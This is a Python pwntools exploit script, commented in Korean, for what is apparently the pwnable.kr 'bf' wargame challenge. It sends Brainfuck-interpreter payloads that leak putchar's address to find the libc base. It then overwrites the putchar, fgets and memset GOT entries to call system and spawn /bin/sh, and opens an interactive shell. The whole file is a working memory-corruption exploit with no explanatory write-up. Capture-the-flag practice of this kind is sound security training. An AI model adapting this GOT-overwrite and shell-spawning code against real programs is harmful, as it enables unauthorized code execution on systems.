import pwn
import time

payload1 = bytes(b'\x3C' * 0x70 + 
                b'\x2E\x2E\x3E\x2E\x3E\x2E\x3E\x2E' + # 로딩된 putchar 주소 출력명령
                b'\x3C' * 3 + # 그리고 원래대로 돌림
                b'\x2C\x3E\x2C\x2C\x3E\x2C\x2C\x3E\x2C\x2C\x3E\x2C\x2E\x00' + b'\n' + # putchar GOT 조작코드, 마지막에 putchar 실행

                b'\x71\n\x86\n\x04\n\x08\n' # 변경될 putchar 주소
            ) 

print("payload1 size : ", hex(len(payload1)))

#p = pwn.process('./bf', env={'LD_PRELOAD':'./bf_libc.so'})
p = pwn.remote("pwnable.kr", 9001)

print(p.recvline())
print(p.recvline())

p.send(payload1)

time.sleep(1)
putchar_addr_print = p.recv()
putchar_addr = 0
putchar_offset = 0x61920

# putchar 주소 출력결과를 쓰기 쉽게 가공하기
for i in range(0, 4) :
    putchar_addr += putchar_addr_print[i + 1] << (8 * i)

print("putchar addr : ", hex(putchar_addr))
libc_base = putchar_addr - putchar_offset
print("libc base : ", hex(libc_base))

system_offset = 0x3ada0
system_addr = libc_base + system_offset
system_addr_print = ''

gets_offset = 0x5f3e0
gets_addr = libc_base + gets_offset
gets_addr_print = ''

# 페이로드에 구한 주소값 작성
for i in range(0, 4) :
    gets_addr_print += chr((gets_addr >> 8 * i) & 0xFF) + '\n'

for i in range(0, 4) :
    system_addr_print += chr((system_addr >> 8 * i) & 0xFF) + '\n'


payload2 = bytes(b'\x3C' * 0x90 + 
                b'\x2C\x3E\x2C\x2C\x3E\x2C\x2C\x3E\x2C\x2C\x3E\x2C' + # fgets GOT 조작코드
                b'\x3E' * 0x18 + b'\x2C\x3E\x2C\x2C\x3E\x2C\x2C\x3E\x2C\x2C' # memset GOT 조작코드
                + b'\x3C' * 0x1B + b'\x2C' +  # 입력버퍼의 \n 버리기
                b'\x2E\x00' + b'\n' # 마지막에 putchar 실행
            ) 

payload2 += bytes(system_addr_print, 'latin1')
payload2 += bytes(gets_addr_print, 'latin1')
payload2 += b'/bin/sh\n' # 실행할 커맨드

print("payload2 size : ", hex(len(payload2)))

p.send(payload2)

p.interactive()
